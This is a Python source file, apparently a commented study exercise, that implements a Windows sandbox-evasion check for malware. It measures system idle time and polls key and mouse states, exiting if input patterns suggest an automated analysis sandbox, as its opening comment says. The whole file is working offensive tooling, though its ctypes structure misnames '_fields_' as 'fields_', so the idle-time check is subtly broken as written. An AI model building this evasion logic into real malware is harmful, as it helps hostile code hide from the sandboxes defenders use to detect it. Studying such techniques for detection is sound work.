# sandbox evasion and user-activity detector that monitors system idle time and polls virtual key states to determine if a human user is
# actively operating the machine, allowing malware to terminate itself if it detects an automated sandbox environment.

from ctypes import byref, c_uint, c_ulong, sizeof, Structure, windll
import random
import sys
import time
import win32api

# C compatible structure mirroring the LASTINPUTINFO API layout
class LASTINPUTINFO(Structure): # defines the size of the structure and the timestamp of the last user input event
    fields_ = [ 
        ('cbSize', c_uint),
        ('dwTime', c_ulong)
    ]

# check system idle time
def get_last_input():
    struct_lastinputinfo = LASTINPUTINFO() # instantiates the structure
    struct_lastinputinfo.cbSize = sizeof(LASTINPUTINFO) # sets the correct size for the Windows API
    windll.user32.GetLastInputInfo(byref(struct_lastinputinfo)) # calls API to get the tick-count of the last keyboard/mouse input, 
    # and inserts that into our struct
    run_time = windll.kernel32.GetTickCount() # finds the total time the system has been up since boot
    elapsed = run_time - struct_lastinputinfo.dwTime # subtracts last input time from run time to calculate idle time
    print(f"[*] It's been {elapsed} milliseconds since the last event.") 
    return elapsed

class Detector:
    def __init__(self):
        # initializes counters for user activity tracking
        self.double_clicks = 0
        self.keystrokes = 0
        self.mouse_clicks = 0

    # loops through key codes to check for an input
    # note: this could be done with PyWinHook as was done in the keylogger, but this uses a pure ctypes solution
    def get_key_press(self):
        for i in range(0, 0xff): # loop through 255 possible key codes (covering keyboard and mouse buttons)
            state = win32api.GetAsyncKeyState(i) # calls the API to check the status of key 'i'
            if state & 0x0001: # checks the last 'state' bit that indicates whether the key was pressed since the last time this function was called
                if i == 0x1: # 0x1 is a left mouse click
                    self.mouse_clicks += 1
                    return time.time() # returns the timestamp of the click
                elif i > 32 and i < 127: # checks if the key code is within printable ASCII range
                    self.keystrokes += 1
        return None # returns None if no activity is detected

    # detection and evasion function
    def detect(self):
        # initialize tracking variables
        previous_timestamp = None
        first_double_click = None
        double_click_threshold = 0.35

        max_double_clicks = 10 # threshold for double clicks, if more than this then it's likely a bot in a sandbox
        max_keystrokes = random.randint(10,25) # Randomized keystrokes needed to pass inspection
        max_mouse_clicks = random.randint(5,25) # Randomized clicks needed to pass inspection
        max_input_threshold = 30000 # 30 second max idle time limit, listed in milliseconds

        last_input = get_last_input() # check how long the system has been idle
        if last_input >= max_input_threshold: # if idle for too long, exit, assumed to be a sandbox
            sys.exit(0)

        detection_complete = False # loop control variable
        while not detection_complete: # keep looping until detection_complete is marked as True
            keypress_time = self.get_key_press() # looks for user input
            if keypress_time is not None and previous_timestamp is not None: # if input is detected, calculate time since last input
                elapsed = keypress_time - previous_timestamp

                if elapsed <= double_click_threshold: # if inputs happen consecutively, consider it a double click
                    self.mouse_clicks -= 2
                    self.double_clicks += 1
                    if first_double_click is None:
                        first_double_click = time.time()
                    else:
                        if self.double_clicks >= max_double_clicks: # too many double clicks indicates a sandbox bot, so exit
                            if (keypress_time - first_double_click <=
                                (max_double_clicks*double_click_threshold)):
                                sys.exit(0)
                # once thresholds are met, it changes the detection_complete flag to True and ends the loop
                if (self.keystrokes >= max_keystrokes and
                    self.double_clicks >= max_double_clicks and
                    self.mouse_clicks >= max_mouse_clicks):
                    detection_complete = True

                previous_timestamp = keypress_time # update the timestamp for the next iteration
            elif keypress_time is not None:
                previous_timestamp = keypress_time

if __name__ == '__main__':
    d = Detector() # instantiate the detector
    d.detect() # run the sandbox evasion check
    print('okay.')
